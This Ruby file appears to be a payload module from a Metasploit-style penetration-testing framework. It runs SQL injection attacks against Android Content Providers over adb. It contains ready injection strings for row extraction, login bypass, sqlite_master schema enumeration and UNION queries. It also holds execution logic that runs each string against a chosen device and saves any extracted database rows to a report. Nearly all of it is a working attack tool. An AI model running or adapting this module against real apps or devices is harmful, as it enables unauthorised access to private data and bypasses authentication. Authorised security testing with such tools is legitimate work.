require_relative '../../../core/payload_base'

module MPF
  module Payloads
    module Singles
      module Android
        class SqlInjection < MPF::Core::PayloadBase
          
          def register_info
            @info = {
              name: 'Android SQL Injection Payload',
              module: 'payload/android/singles/sql_injection',
              platform: :android,
              description: 'Executes SQL injection attacks against vulnerable Content Providers. ' \
                          'Extracts data, bypasses authentication, and enumerates database schema.',
              authors: ['MPF Research Team'],
              severity: 'critical'
            }
            @payload_type = :single
          end

          def register_options
            add_option('TARGET_PACKAGE', 'Target application package name', required: true)
            add_option('TARGET_PROVIDER', 'Content Provider authority', required: true)
            add_option('PROVIDER_URI', 'Provider URI path', default: 'data')
            add_option('INJECTION_TYPE', 'Type: extract, bypass, schema, union', default: 'extract')
            add_option('DEVICE', 'Target device ID', default: 'emulator-5554')
            add_option('OUTPUT_FILE', 'Output file for extracted data', default: 'sql_injection_results.txt')
          end

          def generate(opts = {})
            injection_type = get_option('INJECTION_TYPE')
            provider = get_option('TARGET_PROVIDER')
            uri_path = get_option('PROVIDER_URI')

            payloads = case injection_type
            when 'extract'
              generate_extraction_payloads
            when 'bypass'
              generate_bypass_payloads
            when 'schema'
              generate_schema_payloads
            when 'union'
              generate_union_payloads
            else
              generate_extraction_payloads
            end

            {
              type: 'sql_injection',
              target_provider: provider,
              uri: "content://#{provider}/#{uri_path}",
              payloads: payloads,
              description: "SQL injection payloads for #{injection_type} attack"
            }
          end

          def execute(target_info)
            validation = validate
            unless validation[:valid]
              return { success: false, error: validation[:errors] }
            end

            package = get_option('TARGET_PACKAGE')
            provider = get_option('TARGET_PROVIDER')
            uri_path = get_option('PROVIDER_URI')
            device = get_option('DEVICE')
            output_file = get_option('OUTPUT_FILE')

            print_status("Executing SQL injection attack...")
            print_status("Target Provider: #{provider}")
            print_status("Injection Type: #{get_option('INJECTION_TYPE')}")

            payload_data = generate({})
            results = []

            payload_data[:payloads].each_with_index do |payload, idx|
              print_status("Testing payload #{idx + 1}/#{payload_data[:payloads].length}...")
              
              uri = "content://#{provider}/#{uri_path}"
              cmd = "adb -s #{device} shell content query --uri #{uri} --where \"#{payload[:where]}\""
              
              output = `#{cmd} 2>&1`

              if $?.success?
                if output.include?('Row:')
                  print_good("Payload successful: #{payload[:description]}")
                  results << {
                    payload: payload,
                    success: true,
                    output: output,
                    rows_returned: output.scan(/Row:/).length
                  }
                elsif output.include?('SQLiteException') || output.include?('syntax error')
                  print_warning("SQL error detected: #{payload[:description]}")
                  results << {
                    payload: payload,
                    success: false,
                    error: output.lines.first(3).join,
                    indicator: 'SQL injection point confirmed'
                  }
                end
              end
            end

            # Save results
            save_results(results, output_file)

            if results.any? { |r| r[:success] }
              print_good("SQL injection successful!")
              {
                success: true,
                results: results,
                output_file: output_file,
                impact: 'Database access achieved via SQL injection'
              }
            else
              print_error("No successful injections")
              {
                success: false,
                results: results,
                error: 'All injection attempts failed'
              }
            end
          end

          private

          def generate_extraction_payloads
            [
              {
                where: "id='1' OR '1'='1'",
                description: "Basic authentication bypass - extract all rows"
              },
              {
                where: "id='1' UNION SELECT * FROM sqlite_master--",
                description: "Extract database schema"
              },
              {
                where: "id='1' UNION SELECT name, sql FROM sqlite_master WHERE type='table'--",
                description: "Extract table definitions"
              },
              {
                where: "id='1' OR 1=1 LIMIT 100--",
                description: "Extract first 100 rows"
              }
            ]
          end

          def generate_bypass_payloads
            [
              {
                where: "username='admin' OR '1'='1'--",
                description: "Authentication bypass - admin user"
              },
              {
                where: "username='admin'--",
                description: "Comment-based bypass"
              },
              {
                where: "username='' OR 1=1--",
                description: "Always-true condition"
              },
              {
                where: "password='' OR '1'='1'",
                description: "Password bypass"
              }
            ]
          end

          def generate_schema_payloads
            [
              {
                where: "id='1' UNION SELECT name, type FROM sqlite_master--",
                description: "Enumerate database objects"
              },
              {
                where: "id='1' UNION SELECT sql, name FROM sqlite_master WHERE type='table'--",
                description: "Extract CREATE TABLE statements"
              },
              {
                where: "id='1' UNION SELECT name, sql FROM sqlite_master WHERE type='index'--",
                description: "Extract index definitions"
              }
            ]
          end

          def generate_union_payloads
            [
              {
                where: "id='1' UNION SELECT 'test', 'test', 'test'--",
                description: "UNION-based injection - 3 columns"
              },
              {
                where: "id='1' UNION SELECT NULL, NULL, NULL, NULL--",
                description: "UNION-based injection - 4 columns"
              },
              {
                where: "id='1' UNION SELECT group_concat(name), NULL FROM sqlite_master--",
                description: "Concatenate all table names"
              }
            ]
          end

          def save_results(results, filename)
            output_path = "reports/payload/#{filename}"
            
            File.open(output_path, 'w') do |f|
              f.puts "SQL Injection Results"
              f.puts "=" * 60
              f.puts "Timestamp: #{Time.now}"
              f.puts "Target Provider: #{get_option('TARGET_PROVIDER')}"
              f.puts "Injection Type: #{get_option('INJECTION_TYPE')}"
              f.puts "\n"

              results.each_with_index do |result, idx|
                f.puts "\nPayload #{idx + 1}:"
                f.puts "-" * 60
                f.puts "Description: #{result[:payload][:description]}"
                f.puts "Where Clause: #{result[:payload][:where]}"
                f.puts "Success: #{result[:success]}"
                
                if result[:success]
                  f.puts "Rows Returned: #{result[:rows_returned]}"
                  f.puts "\nOutput:\n#{result[:output]}"
                else
                  f.puts "Error: #{result[:error]}" if result[:error]
                  f.puts "Indicator: #{result[:indicator]}" if result[:indicator]
                end
              end
            end

            print_good("Results saved to: #{output_path}")
          end

          def print_status(msg)
            puts "[*] #{msg}"
          end

          def print_good(msg)
            puts "[+] #{msg}"
          end

          def print_warning(msg)
            puts "[!] #{msg}"
          end

          def print_error(msg)
            puts "[-] #{msg}"
          end
        end
      end
    end
  end
end
